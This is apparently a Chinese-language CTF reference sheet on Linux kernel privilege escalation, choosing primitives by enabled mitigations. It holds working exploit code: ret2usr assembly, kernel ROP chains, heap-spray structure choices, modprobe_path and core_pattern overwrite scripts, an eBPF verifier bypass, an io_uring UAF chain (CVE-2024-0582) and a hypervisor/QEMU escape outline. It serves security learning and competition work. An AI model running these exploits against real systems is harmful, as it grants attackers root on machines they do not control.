---
title: Linux 内核提权全手法（判据优先）
phase: pwn
vuln_class: [kernel, pwn, privesc]
summary: 按「哪些缓解开着」选提权原语：SMEP/SMAP 决定 ret2usr 还是 ROP，STATIC_USERMODEHELPER 决定 modprobe_path 还是 core_pattern；含堆喷结构选型表、栈溢出 canary 泄露、eBPF 校验器绕过、io_uring UAF。
---

# Linux 内核提权全手法（按缓解选路）

**用法**：先读 QEMU 启动脚本，把开着的缓解列出来，再查下表决定**用哪个原语**。不要从第一条读到最后一条。
拿到 bzImage + rootfs.cpio 之后先做 §0 侦察，侦察结论直接决定后面全部路线。

## 0. 三十秒侦察（决定全部后续路线）

### 0.1 读启动脚本

```bash
qemu-system-x86_64 -kernel ./bzImage -initrd ./rootfs.cpio \
  -nographic -monitor none -cpu qemu64 \
  -append "console=ttyS0 nokaslr panic=1" -no-reboot -s -m 256M
```

| 脚本里出现 | 意味着 | 影响哪条路 |
|---|---|---|
| `-cpu kvm64,+smep,+smap` | 用户态页不可执行、不可访问 | 不能 ret2usr，必须 ROP |
| `nokaslr` | 内核基址固定 | 不需要泄露 kbase |
| `kpti=1` / 无 `nopti` | 页表隔离 | iretq 返回用户态需 `swapgs_restore_regs_and_return_to_usermode` |
| `oops=panic` | oops 直接整机 panic | **不能**靠 oops 打 dmesg 泄露 |
| 无 `oops=panic` | oops 只杀当前进程 | dmesg 可泄露栈/堆/kbase 指针，多一个信息源 |

调试期先把缓解全关，通了再逐个打开：

```bash
-append "console=ttyS0 nokaslr nopti nosmep nosmap quiet panic=1"
-cpu kvm64
```

`-s` 开 GDB 端口 1234，`target remote :1234` 连。

### 0.2 提取 vmlinux 与 gadget

```bash
# extract-vmlinux 在 Linux 源码 scripts/ 下
./extract-vmlinux ./bzImage > vmlinux
ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax|^swapgs|^iretq" ./vmlinux
# ROPgadget 在内核这种大镜像上明显更慢，优先 ropr
```

### 0.3 配置项判据表

| 配置 | 现象 | 判据 |
|---|---|---|
| `CONFIG_STATIC_USERMODEHELPER` | `modprobe_path` 覆写失效 | 反汇编 `call_usermodehelper_setup`（见 §4.3） |
| FGKASLR | 每函数独立随机化 | `readelf -S vmlinux \| tail -5`：~30 段=关，36000+ 段=开；`file vmlinux` 报 `too many section` |
| `SLAB_FREELIST_RANDOM` | 连续分配不再相邻 | 连开两个同结构，GDB 看地址是否连续 |
| `SLAB_FREELIST_HARDEN` | 空闲链表指针被 XOR 混淆 | GDB 看 freed chunk 首个指针是否像合法地址 |
| `KALLSYMS_ALL` | `.data` 符号可见 | `grep modprobe_path /proc/kallsyms` 有输出 |
| `CONFIG_USERFAULTFD` | 可用 userfaultfd 做堆占位 | 直接调，`-ENOSYS` = 关 |
| eBPF JIT | BPF 可 JIT 编译 | `cat /proc/sys/net/core/bpf_jit_enable`（0 关 / 1 开 / 2 调试） |

## 1. 提权原语选路

```
SMEP/SMAP 都关 → ret2usr（最省事）
SMEP 开        → 内核 ROP：prepare_kernel_cred(0) → commit_creds
只拿到任意写   → 覆写 modprobe_path / core_pattern
只有 UAF     → 堆喷结构 + 劫持函数指针
```

### 1.1 ret2usr（SMEP/SMAP 关闭）

内核能直接执行用户态代码，把 RIP 指到用户态函数即可：

```c
void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"        // prepare_kernel_cred(NULL) → init_cred
        "call rax;"
        "mov rdi, rax;"        // commit_creds(new)
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"
        "mov r15, %[user_ss];    push r15;"
        "mov r15, %[user_sp];    push r15;"
        "mov r15, %[user_rflags];push r15;"
        "mov r15, %[user_cs];    push r15;"
        "mov r15, %[user_rip];   push r15;"
        "iretq;"               // 以 root 身份回用户态
        ".att_syntax;"
        : : ...);
}
```

返回后 `system("/bin/sh")`。

### 1.2 内核 ROP（SMEP 开）

```c
payload[off++] = cookie;                  // canary
payload[off++] = 0;  payload[off++] = 0;  // rbx, r12
payload[off++] = 0;                       // rbp

payload[off++] = pop_rdi_ret;
payload[off++] = 0x0;                     // rdi = NULL
payload[off++] = prepare_kernel_cred;
payload[off++] = mov_rdi_rax_pop1_ret;    // rdi = rax
payload[off++] = 0x0;                     // pop rbx 填充
payload[off++] = commit_creds;

payload[off++] = swapgs_pop1_ret;
payload[off++] = 0x0;
payload[off++] = iretq;
payload[off++] = user_rip;   // spawn_shell
payload[off++] = user_cs;    // 0x33
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;    // 0x2b
```

**关键 gadget 是 `mov rdi, rax`**：`prepare_kernel_cred` 返回值在 RAX，`commit_creds` 要 RDI。找 `mov rdi, rax; ...; ret` 的变体时注意它会顺带破坏哪些寄存器，填充要对上。

**用户态状态必须提前存**：

```c
__asm__("mov %[cs], cs; mov %[ss], ss; mov %[sp], rsp; pushf; pop %[rflags];"
        : [cs]"=r"(user_cs), [ss]"=r"(user_ss),
          [sp]"=r"(user_sp), [rflags]"=r"(user_rflags));
user_rip = (unsigned long)spawn_shell;
```

`CS=0x33`、`SS=0x2b`（x86_64 用户态固定值），`RFLAGS` 存当前值即可。

## 2. 堆喷结构选型（按 kmalloc 大小对号入座）

**判据**：漏洞对象的分配大小决定了你只能用哪个结构去占位。大小对不上，喷多少次都占不到。

| 结构 | cache | 分配触发 | 释放触发 | 用途 |
|---|---|---|---|---|
| `tty_struct` | kmalloc-1024 | `open("/dev/ptmx")` | `close(fd)` | kbase 泄露、RIP 劫持 |
| `tty_file_private` | kmalloc-32 | `open("/dev/ptmx")` | `close(fd)` | kheap 泄露（指向 `tty_struct`） |
| `poll_list` | kmalloc-32~1024 | `poll(fds, nfds, timeout)` | `poll()` 返回 | kheap 泄露、任意 free |
| `user_key_payload` | kmalloc-32~1024 | `add_key()` | `keyctl_revoke()` + GC | 任意值写入 |
| `setxattr` 缓冲 | kmalloc-32~1024 | `setxattr()` | 同一次调用内 | 瞬时任意写 |
| `seq_operations` | kmalloc-32 | `open("/proc/self/stat")` | `close(fd)` | kbase 泄露、RIP 劫持 |
| `subprocess_info` | kmalloc-128 | 内核内部 | 内核内部 | kbase 泄露、RIP 劫持 |

### 2.1 `tty_struct`（kmalloc-1024，0x2B8 字节）

```c
struct tty_struct {
    int magic;                        // +0x00: 必须为 0x5401，否则 tty_ioctl 直接返回
    struct kref kref;                 // +0x04
    struct device *dev;               // +0x08
    struct tty_driver *driver;        // +0x10: 必须是合法内核堆指针，否则 oops
    const struct tty_operations *ops; // +0x18: vtable → kbase 泄露
};
```

- **泄露**：读 `ops`，指向 `.data` 里的 `ptm_unix98_ops` 一类符号 → 算 kbase。
- **劫持**：把 `ops` 改成假 vtable，`ioctl()` 会走 `tty->ops->ioctl()`。
- **两个坑**：`magic` 必须保住 `0x5401`（paranoid check 直接 return）；`driver` 必须是合法堆指针。

### 2.2 `poll_list`（任意 free）

```c
struct poll_list {
    struct poll_list *next;   // +0x00
    int len;                  // +0x08
    struct pollfd entries[];  // +0x0C 变长
};
```

覆写 `next`，`poll()` 结束时会把链表里所有项都 free 掉——包括你写进去的假指针 → **任意地址 UAF**。

### 2.3 `user_key_payload`

```c
struct user_key_payload {
    struct callback_head rcu;  // +0x00 16 字节，GC 回调前不动
    unsigned short datalen;    // +0x10
    char data[];               // +0x18 用户可控
};
```

前 16 字节在 GC 回调前**未初始化**，配 UAF 能读出残留堆数据。释放要 `keyctl_revoke()` 再等 GC。**默认 Docker seccomp 会拦 `add_key`**。

### 2.4 `setxattr` 瞬时写

`setxattr("file", "user.x", data, size, XATTR_CREATE)` 分配缓冲、拷用户数据、同一调用路径内释放。

- 只能做**瞬时**写，不能持久占位；
- 传进去的文件必须存在——exploit 换目录跑时最容易踩这个坑。

## 3. 栈溢出与 canary 泄露

**判据**：模块的 read/write handler 拷贝长度由用户控制，且大于栈上缓冲区。

### 3.1 超长读泄露 canary + kbase

`tmp[32]`（32 个 unsigned long）却允许读 0x1000 字节：

```c
unsigned long leak[40];
read(fd, leak, sizeof(leak));
unsigned long cookie = leak[16];                                  // 栈布局：tmp 在 rbp-0x98，canary 在 rbp-0x18
unsigned long kernel_base = (leak[38] & 0xffffffffffff0000);      // 内核代码指针
long kaslr_offset = kernel_base - 0xffffffff81000000;
```

### 3.2 ioctl 改全局上限绕过长度检查

**判据**：写入长度是跟一个**全局变量**比，而这个全局变量能通过 `ioctl` 改。

```c
// 模块里的洞：
// swrite(): if (MaxBuffer < user_size) return -EFAULT;
// sioctl(cmd 0x20): MaxBuffer = (int)arg;   ← 攻击者可控

ioctl(fd, 0x20, 300);            // 把上限提到 300（实际缓冲只有 128）
write(fd, overflow_payload, 300); // 长度检查通过 → 栈溢出
```

**找法**：审计 `ioctl` 分支里对全局变量的赋值，看它是否被后面的长度/边界检查引用。

## 4. 只拿到任意写时

### 4.1 `modprobe_path` 覆写

内核遇到未知格式的二进制时，以 root 执行 `modprobe_path`（默认 `/sbin/modprobe`）。把它改成你的脚本即可。

**三个前提**：有任意地址写；能创建「畸形二进制」和「恶意脚本」两个文件；`CONFIG_STATIC_USERMODEHELPER` 关闭。

```bash
echo '#!/bin/sh' > /tmp/evil.sh
echo 'cat /flag > /tmp/output' >> /tmp/evil.sh
echo 'chmod 777 /tmp/output' >> /tmp/evil.sh
chmod +x /tmp/evil.sh
# 用任意写把 modprobe_path 改成 "/tmp/evil.sh"
echo -ne '\xff\xff\xff\xff' > /tmp/trigger   # 前 4 字节必须不可打印
chmod +x /tmp/trigger && /tmp/trigger
cat /tmp/output
```

调用链：`execve` → `search_binary_handler` → 无匹配格式 → `request_module("binfmt-XXXX")` → `call_modprobe` → 以 root 执行。

**坑**：触发文件前 4 字节必须**不可打印**（不是 ASCII 且不含 tab/换行），否则内核会跳过 `request_module`。

### 4.2 无泄露时爆破 `modprobe_path`

KASLR 下 `modprobe_path` 只有 **1 字节熵**（页偏移），有任意写就能爆破 256 次：

```python
MODPROBE_BASE = 0xffffffff8265ff00        # nokaslr 调试时读到的地址
for byte_guess in range(256):
    addr = (MODPROBE_BASE & ~0xFF0000) | (byte_guess << 16)
    write_string(addr, "/tmp/evil.sh")
    trigger_modprobe()
```

### 4.3 判断 `CONFIG_STATIC_USERMODEHELPER` 是否开启

开了之后 `call_usermodehelper_setup()` 用硬编码常量，覆写 `modprobe_path` 完全无效。

```bash
cat /proc/kallsyms | grep call_usermodehelper_setup    # 拿地址
echo -ne '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x
# GDB 断点后反汇编看：
#   未开：rdi 在 +9 存进 r14，+127 处用 r14 → modprobe_path 透传
#   开了：+122 处是立即数常量而非 r14 → 第 1 个参数被忽略
```

### 4.4 `core_pattern` 覆写（替代路线）

`/proc/sys/kernel/core_pattern` 以 `|` 开头时，内核会把后续内容当命令执行。进程崩溃即触发。

```text
core_pattern = "|/tmp/evil.sh"
```

**找地址**（没有 `KALLSYMS_ALL` 时它不在 `/proc/kallsyms`）：

1. 在 `override_creds()`（`do_coredump()` 会调）下断点；
2. 让一个进程崩溃：`int main(){ ((void(*)())0)(); }`；
3. `override_creds` 返回后反汇编，找 `movzx` 从数据地址取值的那条；
4. 那个地址就是 `core_pattern`。

```text
(gdb) finish
(gdb) x/5i $rip
=> 0xffffffff811b1e98:  movzx r13d, BYTE PTR [rip+0xcfec80]  # 0xffffffff81eb0b20
(gdb) x/s 0xffffffff81eb0b20
0xffffffff81eb0b20: "core"
```

## 5. 堆溢出：size 计算不匹配

**判据**：`kmalloc(len)` 却 `memcpy` 了 `0x40 + len`（头 + 体），多出固定偏移的溢出。

```c
buf = kmalloc(content_length, GFP_KERNEL);
memcpy(buf, http_header, 0x40);            // 头
memcpy(buf + 0x40, body, content_length);  // 溢出
```

**打法**：

1. 开 1021 个 fd 铺满 kmalloc-256；
2. 关 3 个制造空洞；
3. 发请求让溢出落进相邻的 `struct file`；
4. 改 `f_op`（文件操作函数表指针）指向假 vtable；
5. 触发被劫持的操作（`read`/`write`/`ioctl`）→ `commit_creds(prepare_kernel_cred(0))`。

**为什么选 `struct file`**：它在 kmalloc-256 且含 `f_op` 函数表，改掉就控制了该 fd 的所有文件操作。

## 6. eBPF 校验器绕过

**判据**：内核版本落在有校验器 bug 的区间，且允许非特权 BPF（或挑战给了加载 BPF 的入口）。

核心模式是**校验器的静态推导与硬件实际行为不一致**：

```c
// 右移失同步（D^3CTF 2022 一类）
// 校验器认为：shr reg, 64 → reg = 0
// 硬件实际：  shr reg, 64 → 值不变（移位量 ≥ 位宽属未定义，x86 只取低 6 位 → 移 0 位）

BPF_ALU64_IMM(BPF_RSH, BPF_REG_7, 64),        // 校验器: R7=0，运行时: R7=原值
BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, offset),    // 校验器: 0*offset=0，运行时: offset
BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7), // 校验器允许（加 0）→ 实际 map_ptr+offset 越界
```

拿到任意读写后：读相邻 slab 对象泄露 kbase，写 `modprobe_path` 或 `current->cred`。

**另一类**：`bpf_skb_load_bytes(skb, offset, stack_buf, len)` 校验 `len <= 512`，但失同步让运行时 `len` 巨大 → 栈溢出 → ROP。

**找洞思路**：翻内核 changelog 里的 eBPF 校验器补丁，每个补丁都意味着一个曾经可利用的洞。

### 6.1 题给内核补丁：自定义 helper 的 verifier 契约

有些题不是让你找校验器 bug，而是**给了你一个内核 patch，加了个自定义 helper**，让你找这个 helper 自身的缺陷（越界读写、类型混淆）。判据：题目附 `diff` 或 `*.patch`，里面出现 `BPF_CALL_N` / `bpf_func_proto` / `FN(xxx, N, ##ctx)` 三件套，就属这一类。

自定义 helper 的完整接线是**四个文件**，缺一处就注册不上：

| 文件 | 改什么 |
|---|---|
| `include/uapi/linux/bpf.h` | `FN(helper_name, 212, ##ctx)` 分配 func id（紧跟已有最大号） |
| `include/linux/bpf.h` | `extern const struct bpf_func_proto bpf_xxx_proto;` |
| `kernel/bpf/helpers.c` | `BPF_CALL_N(...)` 实现 + `const struct bpf_func_proto` 定义 |
| 同上文件 `bpf_base_func_proto()` | `case BPF_FUNC_xxx: return &bpf_xxx_proto;` |

**漏洞就在 `bpf_func_proto` 的 arg 类型声明里**。verifier 完全按这张表做检查，声明与实现不一致就是洞：

```c
BPF_CALL_3(bpf_demo_xor, const char *, buf, size_t, buf_len, s64 *, res) {
    s64 _res = 2025;
    if (buf_len != sizeof(s64)) return -EINVAL;
    _res ^= *(s64 *)buf;
    *res = _res;                 // 无条件写 *res
    return 0;
}

const struct bpf_func_proto bpf_demo_xor_proto = {
    .func      = bpf_demo_xor,
    .ret_type  = RET_INTEGER,
    .arg1_type = ARG_PTR_TO_MEM | MEM_RDONLY,
    .arg2_type = ARG_CONST_SIZE,
    .arg3_type = ARG_PTR_TO_FIXED_SIZE_MEM | MEM_UNINIT | MEM_ALIGNED | MEM_RDONLY,
    .arg3_size = sizeof(s64),
};
```

判据表——每个 flag 缺失都对应一类攻击：

| arg 类型标志 | 缺了会怎样 |
|---|---|
| `ARG_PTR_TO_MEM`（无 `MEM_RDONLY`） | helper 可写调用方 buffer，绕过只读栈/包数据约束 |
| `MEM_UNINIT` 缺失 | verifier 要求调用前初始化，反而堵住「未初始化栈泄露」 |
| `ARG_CONST_SIZE` vs `ARG_CONST_SIZE_OR_ZERO` | 后者允许 len=0，配合内部减法易出下溢 |
| `ARG_PTR_TO_FIXED_SIZE_MEM` + `arg3_size` | 不写 size 时 verifier 只查指针类型，不查长度 → 越界写 |
| `ARG_ANYTHING` | 完全不校验，寄存器里的任意标量都能当指针传 |

**验证路径**：`bpf_prog_load` 失败时 dmesg / gdb 断在 `check_mem_access`（`kernel/bpf/verifier.c`），栈回溯 `check_mem_access → do_check → do_check_common → bpf_check → bpf_prog_load → __sys_bpf` 就是「校验器拒绝了这条指令」。此时看 `check_mem_access` 的 `t`（`BPF_WRITE`/`BPF_READ`）和 `bpf_size` 参数，就知道卡在哪个访问上——把该处的 arg 声明放宽就是绕过方向。

**纪律**：这类题不需要找通用校验器 bug，**只找题目新加的那个 helper**。把 patch 里所有 `arg_type` 逐行和上表对照，通常一两处就能定位。

## 7. 多层挑战（用户态→内核→Hypervisor）

**判据**：题目给了 `user.elf` + `kernel.bin` + hypervisor 三层。

关键是分清**代码要在哪层跑**和**数据必须放在哪层**。典型链路：

1. 用户态有个写原语（如 RPN 计算器覆写 GOT），改成跳到 `kernel.bin` 里的特权 stub；
2. 内核态直接 `out` 到 I/O 端口（`0x8000..0x80FF`）触发 hypercall——hypervisor 把这些端口当 syscall 分发；
3. hypervisor 只接受**位于内核内存**的字符串参数，所以先用一个故意失败的 `open()` 把目标路径种进内核缓冲，再用该缓冲地址重新发 hypercall。

```asm
mov dx, 0x8000 + 5          ; 端口 = 基址 + syscall 号（这里是 open）
mov eax, <kernel_buffer>    ; 参数必须在内核内存里
out dx, eax

mov dx, 0x8000 + 0          ; syscall 0 = read
mov eax, flag_buffer
out dx, eax
```

**可迁移的结论**：VM 逃逸里，「guest 内核原语 + I/O 端口写」能绕过 guest 自己的 syscall 表。找 VMM 会 trap 的 MMIO 区或端口段，它们本质是 hypercall，且常常没有正式 hypercall 接口那套参数校验。

## 8. 特殊入口

### 8.0 QEMU 设备模拟：MMIO / PMIO 回调越界

**判据**：题目给了 QEMU 启动脚本（`-device xxx`）或目标是 `qemu-system-*`，且要逃逸到宿主机。

```text
MMIO：设备寄存器映射到内存地址，guest 读写触发回调
PMIO：端口 I/O，in/out 指令触发回调
```

判据是**设备的 `mmio_ops` / `pio_ops` 里的 read/write 回调有没有边界检查**。常见洞是 `case` 分支对 `addr` 没做范围校验：

```c
static uint64_t mmio_read(void *opaque, hwaddr addr, unsigned size) {
    return state->buf[addr];        // addr 没校验 → 越界读 QEMU 进程内存
}
```

越界读写落在 QEMU 进程自己的地址空间，读到函数指针或堆指针就能算基址，写就能劫持控制流 → 逃逸到宿主机。

**纪律**：先 `-device help` 确认设备名，再在 QEMU 源码里搜该设备的 `MemoryRegionOps` 结构体，看 `read`/`write` 实现有没有 `if (addr > SIZE)` 这类检查。没有就是洞。

### 8.1 ACPI DSDT 注入（题目让你提供 ACPI 表）

**判据**：启动时加载攻击者提供的 DSDT/SSDT。

ACPI AML 在常规内核保护生效**之前**运行，且有直接物理内存访问能力。`OperationRegion(SystemMemory, ...)` 加 `Field` 写就是一个内核写原语：

```asl
OperationRegion (PWDN, SystemMemory, 0x1241000, 0x400)
Field (PWDN, AnyAcc, NoLock, Preserve) { JMPA, 0x400 }
JMPA = Buffer () { 0x41, 0x55, 0x41, 0x54, 0x48, /* shellcode */ }
```

把 shellcode 写进内核内存，或直接 patch `commit_creds` 序言，让后续任何 setuid 调用都提权。

### 8.2 `set_fs()` 未恢复（ARM）

**判据**：`fcntl64` 类系统调用设置了 `KERNEL_DS` 却没恢复（CVE-2015-8966）。

之后 `copy_from/to_user` 接受内核地址。直接读 MMU 受限区域会 panic，所以用**管道做中转**：

```c
if (fork() == 0) {
    trigger_fcntl64_bug();                 // 现在处于 KERNEL_DS
    write(pipe_w, (void*)kernel_addr, N);  // 无检查的内核读
    _exit(0);
}
read(pipe_r, leak, N);
```

拿到 cred 结构后原地把 `uid/gid/euid/egid` 改成 0。

## 9. io_uring PBUF_RING UAF（CVE-2024-0582）

**判据**：内核 6.4 ~ 6.6.13，或 6.7 < 6.7.2。

**必须先分清两条路径**——很多公开 PoC 混了：

| 方面 | PBUF_RING（`IORING_REGISTER_PBUF_RING`） | 用户态 SQE（`IORING_OP_PROVIDE_BUFFERS`） |
|---|---|---|
| 后备 | 内核分配的 `io_buffer_list`，内核管引用计数 | 用户态 mmap 的 SQ 环，entry 是 `copy_from_user` 拷来的 |
| 生命周期 | 由 `io_buffer_list.ref` 管，须活到所有 `provide_buffers` 完成 | 瞬时，`io_submit_sqe()` 同步消费 |
| 有无洞 | `io_unregister_pbuf_ring()` 直接 `kfree(bl)`，不等还在引用 `bl->buf_ring` 的请求 → UAF | **无洞**，SQE 是栈拷贝，没有持久指针 |

**利用链**：

```c
// 1. 注册 0x1000 大小的 PBUF_RING
io_uring_register_buf_ring(ring_fd, &(struct io_uring_buf_reg){
    .ring_addr = (unsigned long)br, .ring_entries = 16, .bgid = 1 });

// 2. 铺一批会挂住的 PROVIDE_BUFFERS，把 ring 钉住
io_uring_prep_provide_buffers(sqe, br, 0, 16, 1, 0);
sqe->flags |= IOSQE_IO_LINK;   // 保持 pending

// 3. 请求还在飞的时候注销 → io_buffer_list 被 UAF free
io_uring_unregister_buf_ring(ring_fd, 1);

// 4. 堆喷回收该槽位（msg_msg / seq_operations / cred），写入假 buf_ring 指针
spray_kmalloc_1024(controlled_data);

// 5. 完成挂住的请求 → 内核往「回收后的缓冲」写 bid/resv → 任意写或信息泄露
```

**两个原语**：
- **泄露**：free 之后用 `IORING_OP_READ` 从挂住的 `provide_buffers` 读，得到回收对象的残留（含 `msg_msg.m_list` 指针 → kheap/kaslr）。
- **写**：用 `cred` 或 `modprobe_path` 附近的相邻对象回收，完成请求时覆写 `uid` 或函数指针。

**验证补丁**：`io_uring/register.c` 里应出现 `io_buffer_list_put()` + 同步等待。

## 10. 纪律

- **先读启动脚本再动手**。缓解组合决定原语，猜错方向整条链白写。
- **堆喷结构必须按 cache 大小选**。大小不对，喷一万次也占不到那个槽。
- **任意写优先考虑 `modprobe_path`**，它只有 1 字节熵，不需要泄露。被 `STATIC_USERMODEHELPER` 挡了才转 `core_pattern`。
- **`iretq` 返回前必须存用户态状态**，`swapgs` 不能漏。
- **每次只开一个缓解**调试。全开状态下定位问题，你会分不清是哪一层拦的。
